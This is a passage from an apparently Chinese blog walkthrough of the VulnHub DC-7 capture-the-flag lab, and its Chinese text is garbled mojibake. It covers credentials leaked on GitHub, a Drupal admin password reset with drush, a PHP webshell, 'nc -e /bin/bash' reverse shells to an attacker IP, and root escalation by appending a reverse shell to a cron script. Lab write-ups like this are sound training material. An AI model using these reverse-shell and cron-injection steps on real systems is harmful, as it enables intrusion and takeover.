<p>è™½ç„¶è¿™æ˜¯è¾ƒæ—©çš„ DC ç‰ˆæœ¬çš„ä¸€ç§åˆä¹é€»è¾‘çš„è¿›å±•ï¼ˆæˆ‘ä¸ä¼šå‘Šè¯‰ä½ æ˜¯å“ªä¸€ä¸ªï¼‰ï¼Œä½†å…¶ä¸­æ¶‰åŠåˆ°ä¸€äº›æ–°æ¦‚å¿µï¼Œä½†ä½ éœ€è¦è‡ªå·±å¼„æ¸…æ¥šè¿™äº›ã€‚:-) å¦‚æœæ‚¨éœ€è¦ä½¿ç”¨æš´åŠ›ç ´è§£æˆ–å­—å…¸æ”»å‡»ï¼Œæ‚¨å¯èƒ½ä¸ä¼šæˆåŠŸã€‚</p>
<p>æ‚¨éœ€è¦åšçš„æ˜¯è·³å‡ºæ¡†æ¡†æ€è€ƒã€‚</p>
<p>Waaaaaayâ€œåœ¨ç›’å­å¤–é¢â€ã€‚:-)</p>
</blockquote>
<h2 id="ä¿¡æ¯æ”¶é›†-6"><a href="#ä¿¡æ¯æ”¶é›†-6" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p><code>nmap</code>æ‰«ææŸ¥çœ‹å¼€æ”¾ç«¯å£</p>
<p><img src="/post/vulnhub/image-20221018195918528.png" alt="image-20221018195918528"></p>
<p>å‘ç°è¿è¡Œç€<code>22</code>å’Œ<code>80</code>ç«¯å£ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code></p>
<p>å…ˆçœ‹çœ‹æ¡†æ¶å’Œè¯­è¨€</p>
<p><img src="/post/vulnhub/image-20221018194429569.png" alt="image-20221018194429569"></p>
<p><code>CMS</code>æ˜¯<code>Drupal 8</code>ï¼Œçœ‹æ¥è¿™æ˜¯å…³é”®ã€å¥½å®¶ä¼™ï¼Œ<code>DC1</code>é‡ç°ã€‘</p>
<p>å†é¡ºæ‰‹æ‰«ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20221018194353195.png" alt="image-20221018194353195"></p>
<p>çœ‹åˆ°æœ‰ä¸€ä¸ªç™»å½•çª—å£é¡µé¢</p>
<p><img src="/post/vulnhub/image-20221018194531613.png" alt="image-20221018194531613"></p>
<p>é‚£æˆ‘ä»¬å°±å…ˆæƒ³åŠæ³•æ€ä¹ˆè·å¾—ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç </p>
<hr>
<h2 id="1-è·³å‡ºæ¡†æ¶"><a href="#1-è·³å‡ºæ¡†æ¶" class="headerlink" title="1.è·³å‡ºæ¡†æ¶"></a>1.è·³å‡ºæ¡†æ¶</h2><blockquote>
<p>è¿™é‡Œæˆ‘å¼€å§‹ä»¥ä¸ºæ˜¯æ€ç»´çš„æ¡†æ¶ï¼Œç»“æœæ˜¯é¶æœºçš„æ¡†æ¶ï¼Œæˆ‘ä»¬éœ€è¦ç”¨æœç´ å·¥å…·ï¼Œå¾—åˆ°æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œè€Œä¸æ˜¯æ­»è„‘ç­‹åœ¨é¶æœºä¸Šè‹¦è‹¦æ‰¾æ¼æ´æˆ–è€…è›®ç”¨çˆ†ç ´</p>
<p>åœ¨å®é™…çš„ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œåœ¨ç½‘ç«™ä¹‹å¤–è·å¾—ç½‘ç«™çš„ä¿¡æ¯ï¼Œè¿™ä¹Ÿæ˜¯æ”¶é›†ä¿¡æ¯çš„ä¸€ä¸ªé‡è¦çš„åŠæ³•</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221018200526154.png" alt="image-20221018200526154"></p>
<p>åœ¨ç½‘ç«™çš„æœ€åº•ä¸‹æˆ‘ä»¬å‘ç°äº†</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DC</span>7USER</span><br></pre></td></tr></table></figure>

<p>è¿™åº”è¯¥æ˜¯ç½‘ç«™çš„æ­å»ºè€…ï¼Œå¯¹äºåƒè¿™ç§å°ç½‘ç«™ï¼Œä¸€èˆ¬å¯èƒ½æ˜¯åœ¨ä¸€äº›å¹³å°ï¼Œæ¯”å¦‚<code>github</code>ä¸Šæ­å»ºã€æŒ‚è½½çš„ã€æ¯”å¦‚æˆ‘çš„åšå®¢ã€‘ï¼Œæ‰€ä»¥åœ¨è¿™äº›å¹³å°ä¸Šï¼Œæˆ‘ä»¬å¾ˆæœ‰å¯èƒ½å¾—åˆ°ä¸€äº›æˆ‘ä»¬æƒ³è¦çš„æ•æ„Ÿä¿¡æ¯å’Œæ–‡ä»¶</p>
<p>æ‰€ä»¥æˆ‘ä»¬ç”¨<code>bing</code>æŸ¥ä¸€ä¸‹ã€å›½å†…æœç´¢å¼•æ“å¾ˆéš¾æœåˆ°ï¼Œè°·æ­Œè¦é­”æ³•ï¼Œæˆ‘å†™è¿™<code>DC7</code>è¿™å‡ å¤©ä¸æ–¹ä¾¿é­”æ³•ï¼Œæ‰€ä»¥<code>bing</code>æœ€å¥½ã€‘</p>
<p>è¿˜çœŸæ‰¾åˆ°äº†</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Dc7User/</span>staffdb<span class="regexp">/blob/m</span>aster/config.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221018201258802.png" alt="image-20221018201258802"></p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">|<span class="string"> &lt;?php </span>|<span class="string">                                                              </span>|</span><br><span class="line">|<span class="string"> ----- </span>|<span class="string"> ------------------------------------------------------------ </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $servername = &quot;localhost&quot;;                                   </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $username = &quot;dc7user&quot;;                                       </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $password = &quot;MdR3xOgB7#dW&quot;;                                  </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $dbname = &quot;Staff&quot;;                                           </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> $conn = mysqli_connect($servername, $username, $password, $dbname); </span>|</span><br><span class="line">|<span class="string">       </span>|<span class="string"> ?&gt;                                                           </span>|</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è´¦å·å’Œå¯†ç ï¼Œä»¥åŠæ•°æ®åº“çš„åå­—ï¼Œçœ‹æ¥æˆ‘ä»¬ç¡®å®è·³å‡ºäº†æ¡†æ¶</p>
<p>æˆ‘ä»¬åˆ©ç”¨è´¦å·å¯†ç åœ¨æˆ‘ä»¬ä¹‹å‰çš„ç½‘ç«™ç™»å½•ä¸€ä¸‹è¯•è¯•</p>
<blockquote>
<p>$username &#x3D; â€œ<code>dc7user</code>â€œ;<br>$password &#x3D; â€œ<code>MdR3xOgB7#dW</code>â€œ;  </p>
</blockquote>
<p><img src="/post/vulnhub/image-20221018201801467.png" alt="image-20221018201801467"></p>
<p>ç»“æœæŠ¥é”™ï¼Œçœ‹æ¥è¿™ä¸ªè´¦å·å¹¶ä¸æ˜¯åœ¨è¿™ä¸ªé¡µé¢ç™»å½•çš„</p>
<h2 id="2-sshç™»å½•"><a href="#2-sshç™»å½•" class="headerlink" title="2.sshç™»å½•"></a>2.sshç™»å½•</h2><p>æˆ‘ä»¬æ ¹æ®ä¹‹å‰å¾—åˆ°çš„ä¿¡æ¯çŸ¥é“ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code>ï¼Œæˆ‘ä»¬ç”¨å…¶ç™»å½•è¯•è¯•</p>
<blockquote>
<p>$username &#x3D; â€œ<code>dc7user</code>â€œ;<br>$password &#x3D; â€œ<code>MdR3xOgB7#dW</code>â€œ;  </p>
</blockquote>
<p><img src="/post/vulnhub/image-20221018202130724.png" alt="image-20221018202130724"></p>
<p>å¥½å®¶ä¼™ï¼Œæœç„¶æ˜¯<code>ssh</code>çš„è´¦å·å¯†ç </p>
<p>æˆ‘ä»¬æ¥æ‰¾æ‰¾æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221018202308173.png" alt="image-20221018202308173"></p>
<p>æˆ‘ä»¬å…ˆæ‰“å¼€<code>backups</code>æ–‡ä»¶å¤¹</p>
<p><img src="/post/vulnhub/image-20221018202658047.png" alt="image-20221018202658047"></p>
<p>å‘ç°æ˜¯ä¸¤ä¸ª<code>.gpg</code>æ–‡ä»¶</p>
<blockquote>
<p><code>gpg</code>æ–‡ä»¶<br>å°±æ˜¯ä¸€ä¸ªåŠ å¯†æ–‡ä»¶</p>
</blockquote>
<p>è€Œæˆ‘ä»¬ç°åœ¨æ²¡æœ‰ä¿¡æ¯å’Œå¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å†çœ‹çœ‹å¦ä¸€ä¸ªæ–‡ä»¶</p>
<blockquote>
<p>è¿”å›ä¸Šçº§ç›®å½•<br><code>cat mbox</code> </p>
</blockquote>
<p><img src="/post/vulnhub/image-20221018203146128.png" alt="image-20221018203146128"></p>
<p>å‘ç°æ˜¯<code>root</code>ç”¨æˆ·å‘½ä»¤æ‰§è¡Œçš„è®°å½•</p>
<p>å‘ç°äº†</p>
<blockquote>
<p><code>Database dump saved to /home/dc7user/backups/website.sql</code><br>&#x2F;&#x2F;æ•°æ®åº“ä¿¡æ¯å­˜å…¥website.sqlæ–‡ä»¶<br>&#x2F;&#x2F;ç„¶årootæ‰§è¡Œäº†åŠ å¯†è„šæœ¬åŠ å¯†æ•°æ®åº“æ–‡ä»¶</p>
</blockquote>
<p><img src="/post/vulnhub/image-20221018203403493.png" alt="image-20221018203403493"></p>
<h3 id="å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘"><a href="#å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘" class="headerlink" title="*å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘"></a>*å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘</h3><p>æˆ‘ä»¬å‘ç°åœ¨<code>root</code>ç”¨æˆ·æ‰§è¡ŒåŠ å¯†è„šæœ¬ä¹‹å‰æœ‰ä¸€ä¸ª<code>Cron</code></p>
<blockquote>
<p><code>Cron</code>å‘ç°æ˜¯å®šæ—¶ä»»åŠ¡ï¼Œä»£è¡¨è¿‡ä¸€æ®µæ—¶é—´å°±æ‰§è¡Œä¸€æ¬¡ï¼Œä»¥æ¥æ›´æ–°æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ã€<code>backups</code>ã€‘</p>
<p>è¿™æ˜¯ä¸ªå®šæ—¶ä»»åŠ¡ ç”¨<code>root</code> è¿è¡Œ<code>/opt/scripts/backups.sh</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221018203434313.png" alt="image-20221018203434313"></p>
<h3 id="å…³é”®æ€è·¯"><a href="#å…³é”®æ€è·¯" class="headerlink" title="*å…³é”®æ€è·¯"></a>*å…³é”®æ€è·¯</h3><p>æŸ¥çœ‹ä¸‹æƒé™ä»€ä¹ˆçš„ï¼Œå‘ç°<code>www-data</code>æ‹¥æœ‰æ‰§è¡Œå’Œå†™çš„æƒé™ï¼Œæˆ‘ä»¬å½“å‰æƒé™æ²¡æœ‰å†™æƒé™ï¼Œçœ‹æ¥æ²¡åŠæ³•åŠ¨æ‰‹è„šäº†ã€‚</p>
<p><img src="/post/vulnhub/image-20221018234503615.png" alt="image-20221018234503615"></p>
<h3 id><a href="#" class="headerlink" title></a></h3><p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬è·å¾—äº†<code>www-data</code>çš„<code>shell</code> é‚£å°±å¯ä»¥å†™ç‚¹ä¸œè¥¿è¿›å»ï¼Œç„¶åä¾é <strong>è®¡åˆ’ä»»åŠ¡</strong>ï¼Œç”¨<code>root</code>å»è¿è¡Œï¼Œç„¶ååå¼¹<code>shell</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥è·å¾—äº†<code>root</code>æƒé™çš„<code>shell</code>äº†ã€‚</p>
<h2 id="3-drushå‘½ä»¤å¯¹drupalä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç "><a href="#3-drushå‘½ä»¤å¯¹drupalä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç " class="headerlink" title="3.drushå‘½ä»¤å¯¹drupalä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç "></a>3.<code>drush</code>å‘½ä»¤å¯¹<code>drupal</code>ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç </h2><p>æˆ‘ä»¬æŒ‰è·¯å¾„æŸ¥çœ‹è¯¥è„šæœ¬å†…å®¹</p>
<p><img src="/post/vulnhub/image-20221018203742731.png" alt="image-20221018203742731"></p>
<p>æˆ‘ä»¬å‘ç°æœç„¶æ˜¯ä¸ªåŠ å¯†æ•°æ®åº“æ–‡ä»¶çš„è„šæœ¬ï¼Œä½†æ˜¯æˆ‘ä»¬ä»ç„¶ä¸çŸ¥é“å¯†ç </p>
<p>ä½†æ˜¯æˆ‘ä»¬å‘ç°äº†æ•°æ®åº“æ–‡ä»¶ä¼¼ä¹è¢«æ›´æ”¹è¿‡</p>
<p>å‡ºç°äº†ä¸€ä¸ªæ–°çš„å‘½ä»¤</p>
<blockquote>
<p><code>drush</code><br>&#x2F;&#x2F;drushå‘½ä»¤æ˜¯åœ¨drupalæ¡†æ¶ä¸­è¿›è¡Œé…ç½®çš„å‘½ä»¤ï¼Œå¯ä»¥ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç ï¼Œ<br>&#x2F;&#x2F;ä½†æ˜¯drushå¿…é¡»åœ¨drupalå®‰è£…ç›®å½•ä¸‹è¿›è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æŒ‰è„šæœ¬ç»™çš„<br><code>cd /var/www/html/</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221018204531647.png" alt="image-20221018204531647"></p>
<blockquote>
<p><code>cd /var/www/html</code><br><code>drush user-password admin:123456</code><br>&#x2F;&#x2F;ç”¨æˆ·å<code>admin</code>å’Œå¯†ç <code>123456</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221018205540723.png" alt="image-20221018205540723"></p>
<p>ç„¶åæˆåŠŸä¿®æ”¹ç”¨æˆ·<code>admin</code>çš„å¯†ç ä¸º<code>123456</code></p>
<p><img src="/post/vulnhub/image-20221018212431462.png" alt="image-20221018212431462"></p>
<h2 id="4-ç™»å½•ç½‘ç«™"><a href="#4-ç™»å½•ç½‘ç«™" class="headerlink" title="4.ç™»å½•ç½‘ç«™"></a>4.ç™»å½•ç½‘ç«™</h2><p>å½“æˆ‘ä»¬è¾“å…¥æˆ‘ä»¬ä¿®æ”¹åçš„å¯†ç åï¼ŒæˆåŠŸç™»å½•<code>admin</code>ç”¨æˆ·</p>
<p><img src="/post/vulnhub/image-20221018212905392.png" alt="image-20221018212905392"></p>
<p>ç„¶åæˆ‘ä»¬ç»Ÿåˆä¸€ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬è¿›å…¥äº†ç½‘ç«™åï¼Œåº”è¯¥å¦‚ä½•æ‹¿åˆ°<code>shell</code>ï¼Œé‚£è‚¯å®šéœ€è¦å†™æœ¨é©¬æˆ–è€…åå¼¹<code>shell</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦æ‰¾åˆ°å¯ä»¥ä¿®æ”¹å¹¶å¢åŠ <code>php</code>æ–‡ä»¶çš„çš„åœ°æ–¹</p>
<p>æˆ‘ä»¬å…ˆæ‰“å¼€<code>content</code>é¡µé¢ï¼Œå‘ç°æœ‰<code>å¼€å§‹.html</code>é¡µé¢</p>
<p><img src="/post/vulnhub/image-20221018212952593.png" alt="image-20221018212952593"></p>
<p>ç‚¹å¼€æŸ¥çœ‹</p>
<p><img src="/post/vulnhub/image-20221018215114742.png" alt="image-20221018215114742"></p>
<p>å‘ç°å¯ä»¥ä¿®æ”¹å†…å®¹ï¼Œçœ‹æ¥æˆ‘ä»¬å¯ä»¥è¯•è¯•ä¿®æ”¹å®ƒï¼Œå˜æˆæˆ‘ä»¬çš„æœ¨é©¬æ–‡ä»¶</p>
<p>ç»“æœå‘ç°æ–‡ä»¶åªèƒ½ä»¥<code>html</code>å½¢å¼æ‰§è¡Œï¼Œè€Œä¸èƒ½ä»¥<code>php</code>å½¢å¼æ‰§è¡Œ</p>
<p><img src="/post/vulnhub/image-20221018215830844.png" alt="image-20221018215830844"></p>
<h3 id="æ·»åŠ phpæ‰§è¡Œæ’ä»¶"><a href="#æ·»åŠ phpæ‰§è¡Œæ’ä»¶" class="headerlink" title="æ·»åŠ phpæ‰§è¡Œæ’ä»¶"></a>æ·»åŠ phpæ‰§è¡Œæ’ä»¶</h3><p><code>drupal</code>æ¡†æ¶å¯ä»¥æ·»åŠ <code>php</code>æ–‡ä»¶æ’ä»¶ï¼Œä»è€Œèƒ½ä¿®æ”¹ä¸º<code>php</code>æ–‡ä»¶</p>
<p><img src="/post/vulnhub/image-20221018220115382.png" alt="image-20221018220115382"></p>
<p>ç‚¹å‡»</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">install <span class="keyword">new</span> <span class="keyword">module</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221018220912473.png" alt="image-20221018220912473"></p>
<p>åœ¨<code>url</code>é‡Œå¡«å†™</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">https</span>://<span class="keyword">ftp</span>.drupal.org/<span class="built_in">files</span>/projects/php<span class="number">-8.</span>x<span class="number">-1.</span>x-dev.tar.gz</span><br></pre></td></tr></table></figure>

<p>ç„¶å<code>install</code></p>
<p><img src="/post/vulnhub/image-20221018221952909.png" alt="image-20221018221952909"></p>
<p>ä½†æ˜¯æˆ‘è¿™é‡Œæ˜¾ç¤ºæ— æ³•è¿æ¥ç½‘ç«™ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¸Šä¼ æ’ä»¶æ–‡ä»¶ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<p><img src="/post/vulnhub/image-20221018222047051.png" alt="image-20221018222047051"></p>
<p>ç„¶åæ·»åŠ æˆåŠŸ</p>
<p><img src="/post/vulnhub/image-20221018222109470.png" alt="image-20221018222109470"></p>
<p>ç„¶ååœ¨<code>FILTERS</code>å¤„</p>
<p>å¯åŠ¨æ’ä»¶ã€å‹¾é€‰ã€‘</p>
<p><img src="/post/vulnhub/image-20221018222451086.png" alt="image-20221018222451086"></p>
<p>æœ€åè®°å¾—è¿˜è¦<code>install</code></p>
<p><img src="/post/vulnhub/image-20221018222512620.png" alt="image-20221018222512620"></p>
<p>ç„¶åæˆ‘ä»¬çš„æ–‡ä»¶å°±å¯ä»¥ä»¥<code>php</code>æ–‡ä»¶å½¢å¼æ‰§è¡Œäº†</p>
<h3 id="åŠ å…¥ä¸€å¥è¯æœ¨é©¬"><a href="#åŠ å…¥ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="åŠ å…¥ä¸€å¥è¯æœ¨é©¬"></a>åŠ å…¥ä¸€å¥è¯æœ¨é©¬</h3><p><img src="/post/vulnhub/image-20221018232816262.png" alt="image-20221018232816262"></p>
<p>ã€è®°ä½<code>Text foromat</code>è¦æ”¹æˆ<code>PHP code</code>ã€‘</p>
<p>ç„¶åä¿å­˜å³å¯</p>
<h2 id="5-èšå‰‘è¿æ¥getshell"><a href="#5-èšå‰‘è¿æ¥getshell" class="headerlink" title="5.èšå‰‘è¿æ¥getshell"></a>5.èšå‰‘è¿æ¥getshell</h2><p>å› ä¸ºæˆ‘ä»¬æ˜¯åœ¨<code>welcome</code>é¡µé¢é‡Œæ’å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œæ‰€ä»¥ç›´æ¥è¿æ¥é¶æœºipå°±è¡Œ</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.146</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221018232842168.png" alt="image-20221018232842168"></p>
<p>è¿æ¥æˆåŠŸ</p>
<p>å¯åŠ¨è™šæ‹Ÿç»ˆç«¯</p>
<p><img src="/post/vulnhub/image-20221018232923762.png" alt="image-20221018232923762"></p>
<p><code>getshell</code></p>
<p><img src="/post/vulnhub/image-20221018233020910.png" alt="image-20221018233020910"></p>
<h2 id="6-åå¼¹shellæ‹¿www-data"><a href="#6-åå¼¹shellæ‹¿www-data" class="headerlink" title="6.åå¼¹shellæ‹¿www-data"></a>6.åå¼¹shellæ‹¿www-data</h2><p>æˆ‘ä»¬å…ˆå¼€å§‹ç›‘å¬<code>9999</code>ç«¯å£</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -lvvp <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221018233321886.png" alt="image-20221018233321886"></p>
<p>æˆ‘ä»¬åœ¨èšå‰‘çš„<code>shell</code>ä¸Š</p>
<p>å¼€å§‹åå¼¹<code>shell</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -e /bin/bash <span class="number">192.168.133.140</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221018233814670.png" alt="image-20221018233814670"></p>
<p>ç„¶åæ‹¿åˆ°åå¼¹<code>shell</code></p>
<p><img src="/post/vulnhub/image-20221018233713840.png" alt="image-20221018233713840"></p>
<p>è¿›å…¥äº¤äº’å¼shell</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">python -<span class="keyword">c</span> <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221018234804275.png" alt="image-20221018234804275"></p>
<h2 id="7-åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒroot"><a href="#7-åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒroot" class="headerlink" title="7.åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒroot"></a>7.åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒ<code>root</code></h2><p>æˆ‘ä»¬å‘ <code>backups.sh</code>å†™å…¥åå¼¹<code>shell</code>å‘½ä»¤</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;nc 192.168.133.140 12345 -e /bin/bash&quot;</span> &gt;&gt; /<span class="keyword">opt</span>/scripts/backups.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221018235007598.png" alt="image-20221018235007598"></p>
<p>ç„¶åæˆ‘ä»¬å†å¼€ä¸€ä¸ªæ§åˆ¶å°å¼€å§‹ç›‘å¬<code>12345</code>ç«¯å£</p>
<p><img src="/post/vulnhub/image-20221018235124023.png" alt="image-20221018235124023"></p>
<p>ç„¶åæˆ‘ä»¬ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œï¼Œä¾¿å¯ä»¥æ‹¿åˆ°<code>shell</code>ã€æ—¶é—´æœ‰ç‚¹ä¹…ã€‘</p>
<p><img src="/post/vulnhub/image-20221019000112748.png" alt="image-20221019000112748"></p>
<p>è¿æ¥æˆåŠŸåï¼Œåˆ°<code>root</code>ç›®å½•æŸ¥çœ‹<code>flag</code></p>
<p><img src="/post/vulnhub/image-20221019123852041.png" alt="image-20221019123852041"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">888      <span class="number"> 888 </span>        <span class="number"> 888 </span>888      8888888b.                            <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888   o  <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span> &quot;Y88b                           <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888  d8b <span class="number"> 888 </span>        <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>                          <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888 d888b<span class="number"> 888 </span> .d88b. <span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span> .d88b.  88888b.   .d88b. <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">888d88888b888 d8P  Y8b<span class="number"> 888 </span>888     <span class="number"> 888 </span>  <span class="number"> 888 </span>d88&quot;&quot;88b<span class="number"> 888 </span>&quot;88b d8P  Y8b<span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br><span class="line">88888P Y88888<span class="number"> 88888888 </span>888<span class="number"> 888 </span>    <span class="number"> 888 </span>  <span class="number"> 888 </span>888 <span class="number"> 888 </span>888 <span class="number"> 888 </span>88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.    <span class="number"> 888 </span>888     <span class="number"> 888 </span> .d88P Y88..88P<span class="number"> 888 </span><span class="number"> 888 </span>Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888 <span class="number"> 888 </span>888      8888888P&quot;   &quot;Y88P&quot; <span class="number"> 888 </span><span class="number"> 888 </span> &quot;Y8888 <span class="number"> 888 </span>888<span class="number"> 888 </span>888 </span><br></pre></td></tr></table></figure>


<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and all those who have taken the time to complete these little</code><br><code>challenges.</code></p>
<p><code>I&#39;m sending out an especially big thanks to:</code></p>
<p><code>@4nqr34z</code><br><code>@D4mianWayne</code><br><code>@0xmzfr</code><br><code>@theart42</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>æ­å–œï¼ï¼ï¼</p>
<p>å¸Œæœ›ä½ å–œæ¬¢ DC-7ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>æä¾›åé¦ˆçš„äººï¼Œä»¥åŠæ‰€æœ‰èŠ±æ—¶é—´å®Œæˆè¿™äº›å°äº‹çš„äºº<br>æŒ‘æˆ˜ã€‚</p>
<p>æˆ‘è¦ç‰¹åˆ«æ„Ÿè°¢ï¼š</p>
<p>@4nqr34z<br>@D4mianWayne<br>@0xmzfr<br>@å¿ƒ42</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<h1 id="å…«ã€DC8-åˆçº§"><a href="#å…«ã€DC8-åˆçº§" class="headerlink" title="å…«ã€DC8[åˆçº§]"></a>å…«ã€DC8[åˆçº§]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hint:</code><br><code>This challenge is a bit of a hybrid between being an actual challenge, and being a &quot;proof of concept&quot; as to whether two-factor authentication installed and configured on Linux can prevent the Linux server from being exploited.</code></p>
<p><code>The &quot;proof of concept&quot; portion of this challenge eventuated as a result of a question being asked about two-factor authentication and Linux on Twitter, and also due to a suggestion by @theart42.</code></p>
<p><code>The ultimate goal of this challenge is to bypass two-factor authentication, get root and to read the one and only flag.</code></p>
<p><code>You probably wouldn&#39;t even know that two-factor authentication was installed and configured unless you attempt to login via SSH, but it&#39;s definitely there and doing it&#39;s job.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>è¿™ä¸ªæŒ‘æˆ˜æœ‰ç‚¹æ··åˆå®é™…æŒ‘æˆ˜å’Œâ€œæ¦‚å¿µè¯æ˜â€ï¼Œå³åœ¨ Linux ä¸Šå®‰è£…å’Œé…ç½®çš„åŒå› ç´ èº«ä»½éªŒè¯æ˜¯å¦å¯ä»¥é˜²æ­¢ Linux æœåŠ¡å™¨è¢«åˆ©ç”¨ã€‚</p>
<p>è¿™ä¸ªæŒ‘æˆ˜çš„â€œæ¦‚å¿µè¯æ˜â€éƒ¨åˆ†æœ€ç»ˆæ˜¯ç”±äº Twitter ä¸Šå…³äºåŒå› ç´ èº«ä»½éªŒè¯å’Œ Linux çš„é—®é¢˜ï¼Œä»¥åŠ@theart42 çš„å»ºè®®ã€‚</p>
<p>æ­¤æŒ‘æˆ˜çš„æœ€ç»ˆç›®æ ‡æ˜¯ç»•è¿‡åŒé‡èº«ä»½éªŒè¯ï¼Œè·å– root æƒé™å¹¶è¯»å–å”¯ä¸€æ ‡å¿—ã€‚</p>
<p>é™¤éæ‚¨å°è¯•é€šè¿‡ SSH ç™»å½•ï¼Œå¦åˆ™æ‚¨å¯èƒ½ç”šè‡³ä¸çŸ¥é“å·²å®‰è£…å’Œé…ç½®äº†åŒå› ç´ èº«ä»½éªŒè¯ï¼Œä½†å®ƒè‚¯å®šå­˜åœ¨å¹¶ä¸”å¯ä»¥æ­£å¸¸å·¥ä½œã€‚</p>
</blockquote>
